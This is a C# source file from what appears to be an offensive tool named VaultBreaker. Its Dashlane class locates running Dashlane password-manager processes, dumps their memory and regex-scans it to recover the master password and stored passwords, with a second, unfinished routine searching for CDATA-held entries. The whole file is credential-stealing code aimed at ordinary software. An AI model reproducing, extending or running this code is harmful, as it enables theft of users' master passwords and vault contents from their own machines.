using System;
using System.Diagnostics;
using VaultBreaker.Helpers;
using System.IO;
using System.Text.RegularExpressions;

namespace VaultBreaker.Core
{
	//Dashlane uses XML & CDATA for their password storage. Should be easy enough to pull out of memory.

	class Dashlane
	{
		public static void dumpDashlaneMaster()
		{
            Process[] procs = Process.GetProcessesByName("dashlane");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
                DebugFunctions.writeDebug(String.Format("Enumerating Process: {0} - {1}", proc.Id, proc.ProcessName), Globals.DebugMode);
                DebugFunctions.writeDebug("Dumping Memory", Globals.DebugMode);
				string strResult = DebugFunctions.ReturnCleanASCII(MemoryHelper.dumpProcessMemory(proc).Replace("\0",string.Empty));
				DebugFunctions.writeDebug("Parsing Memory Dump. Warning this could take a while.", Globals.DebugMode);
				//string r = @"\s{3}(.+)\s{3}receiveNotif";
				string r = @"\s{3}(.+)\0{3}";
				foreach(Match m in Regex.Matches(strResult, r))
				{
					Console.WriteLine("[DEBUG] '{0}' found at index {1}", DebugFunctions.ReturnCleanASCII(m.Value), m.Index);
				}
				DebugFunctions.writeDebug("Finished", Globals.DebugMode);
				Console.ReadKey();
			}
		}
        public static void dumpDashLanePasswords()
        {
            Console.WriteLine("[!] Not Fully Implemented Yet!");
            return;

            //I'll come back to you, I promise.
            Process[] procs = Process.GetProcessesByName("Dashlane");
            Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
            foreach (var proc in procs)
            {
                string strResult = DebugFunctions.ReturnCleanASCII(MemoryHelper.dumpProcessMemory(proc).Replace("\0", string.Empty));
                DebugFunctions.writeDebug("Parsing Memory Dump", Globals.DebugMode);
                //string r = @"\s{3}(.+)\s{3}receiveNotif";
                string r = @"CDATA";
                foreach (Match m in Regex.Matches(strResult, r))
                {
                    Console.WriteLine("[DEBUG] '{0}' found at index {1}", DebugFunctions.ReturnCleanASCII(m.Value), m.Index);
                }
                DebugFunctions.writeDebug("Finished", Globals.DebugMode);
                Console.ReadKey();
            }
        }
    }
}
